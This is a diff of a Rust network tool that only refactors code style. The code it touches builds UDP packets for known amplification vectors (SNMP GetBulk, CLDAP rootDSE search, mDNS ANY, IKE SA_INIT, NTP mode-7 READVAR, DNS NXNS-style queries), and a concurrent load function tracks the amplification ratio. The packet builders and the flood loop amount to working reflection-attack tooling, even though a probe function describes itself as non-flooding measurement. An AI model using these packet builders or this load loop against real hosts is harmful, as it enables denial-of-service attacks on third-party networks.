@@ -271,8 +271,6 @@ fn build_snmp_getbulk() -> Vec<u8> {
     let req_id: u32 = rand::random();
 
     // SNMP message wrapper
-    let pkt;
-
     // SEQUENCE { version, community, data }
     // version = SNMPv2c (1)
     // community = "public"
@@ -325,14 +323,15 @@ fn build_snmp_getbulk() -> Vec<u8> {
     let version = encode_integer(1);
 
     // SNMP message SEQUENCE
-    let mut msg_body = Vec::new();
-    msg_body.extend_from_slice(&version);
-    msg_body.extend_from_slice(&comm);
-    msg_body.extend_from_slice(&pdu);
+    let msg_body = {
+        let mut m = Vec::new();
+        m.extend_from_slice(&version);
+        m.extend_from_slice(&comm);
+        m.extend_from_slice(&pdu);
+        m
+    };
 
-    pkt = build_sequence(&msg_body);
-
-    pkt
+    build_sequence(&msg_body)
 }
 
 fn build_sequence(contents: &[u8]) -> Vec<u8> {
@@ -555,7 +554,6 @@ pub async fn run_udp_load(
 
         for _ in 0..concurrency {
             let host = host.to_string();
-            let mode = mode;
 
             handles.push(tokio::spawn(async move {
                 match run_udp_protocol(mode, &host, port).await {
@@ -583,7 +581,7 @@ pub async fn run_udp_load(
         let elapsed = start.elapsed().as_secs();
 
         // Status update
-        if elapsed % 5 == 0 || total_requests < 10 {
+        if elapsed.is_multiple_of(5) || total_requests < 10 {
             let amp_ratio = if total_sent > 0 {
                 total_recv as f64 / total_sent as f64
             } else {
@@ -631,11 +629,8 @@ fn build_cldap_search() -> Vec<u8> {
     // Format: SEQUENCE { messageID, protocolOp CHOICE { searchRequest } }
     // We build the inner SEQUENCE manually.
     let mut msg = Vec::new();
-
     // MessageID: INTEGER 1 (2 bytes + tag + length)
-    msg.push(0x02); // INTEGER tag
-    msg.push(0x01); // length 1
-    msg.push(0x01); // value 1
+    msg.extend([0x02, 0x01, 0x01]);
 
     // SearchRequest tag (0x63 = APPLICATION 3, constructed)
     // Base object: empty = rootDSE
@@ -649,16 +644,8 @@ fn build_cldap_search() -> Vec<u8> {
     let filter_presence = vec![0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73]; // (objectClass=*) using present filter
 
     let mut search = Vec::new();
-    // baseObject (empty)
-    search.push(0x04); // OCTET STRING
-    search.push(0x00);
-    // scope: ENUMERATED 0 (baseObject)
-    search.push(0x0a); // ENUMERATED
-    search.push(0x01);
-    search.push(0x00);
-    // derefAliases: ENUMERATED 0
-    search.push(0x0a);
-    search.push(0x01);
+    // baseObject (empty) + scope: ENUMERATED 0 (baseObject) + derefAliases: ENUMERATED 0
+    search.extend([0x04, 0x00, 0x0a, 0x01, 0x00]);
     search.push(0x00);
     // sizeLimit: INTEGER 0
     search.push(0x02);
@@ -849,7 +836,7 @@ fn build_mdns_query() -> Vec<u8> {
         b"\x05local",
     ];
     for label in labels {
-        pkt.extend_from_slice(*label);
+        pkt.extend_from_slice(label);
     }
     pkt.push(0x00); // root
     // QTYPE: ANY (255)
@@ -929,9 +916,7 @@ fn build_ike_sa_init() -> Vec<u8> {
         pkt.push(rand::random::<u8>());
     }
     // Responder SPI (8 bytes) — zero
-    for _ in 0..8 {
-        pkt.push(0x00);
-    }
+    pkt.extend([0x00; 8]);
     // Next payload: 1 (SA)
     pkt.push(0x01);
     // Version: 1.0 (0x10)
@@ -1050,12 +1035,7 @@ fn build_ntp_readvar() -> Vec<u8> {
     let mut pkt = Vec::new();
 
     // NTP v4 mode 7 header byte
-    pkt.push(0x27); // LI=0, VN=4, Mode=7
-
-    // Implementation: 0 (NTP implementation)
-    pkt.push(0x00);
-    // Request code: 2 (READVAR)
-    pkt.push(0x02);
+    pkt.extend([0x27, 0x00, 0x02]); // LI=0, VN=4, Mode=7; Implementation: 0; Request code: 2 (READVAR)
     // auth_flag(2)=0, sequence(6)=0
     pkt.push(0x00);
     // Auth key ID: 0
@@ -1251,7 +1231,7 @@ fn build_dns_nxns() -> Vec<u8> {
     // Each label is a random 6-char subdomain
     let mut domain = String::new();
     for _ in 0..30 {
-        let label: String = (0..6).map(|_| rand::random::<u8>() % 26 + b'a' as u8)
+        let label: String = (0..6).map(|_| rand::random::<u8>() % 26 + b'a')
             .map(|b| b as char)
             .collect();
         domain.push_str(&format!("{}.{}", label.len(), label));
@@ -1403,11 +1383,11 @@ pub async fn run_udp_probe(target: &str, timeout_ms: u64) {
 
     println!("=== UDP PROBE: {} ===", target);
     println!("Single query per vector, {}ms window. No flood. Measures real amplification.", timeout_ms);
-    if custom_port.is_some() {
-        println!("Explicit port override: {} (used for ALL vectors)", custom_port.unwrap());
+    if let Some(p) = custom_port {
+        println!("Explicit port override: {} (used for ALL vectors)", p);
     }
     println!();
-    println!("{:<15} {:>6} {:>8} {:>9}  {}", "MODE", "SENT", "RECV", "AMP", "STATUS");
+    println!("{:<15} {:>6} {:>8} {:>9}  STATUS", "MODE", "SENT", "RECV", "AMP");
     println!("{}", "-".repeat(62));
 
     let mut effective: Vec<(String, f64)> = Vec::new();
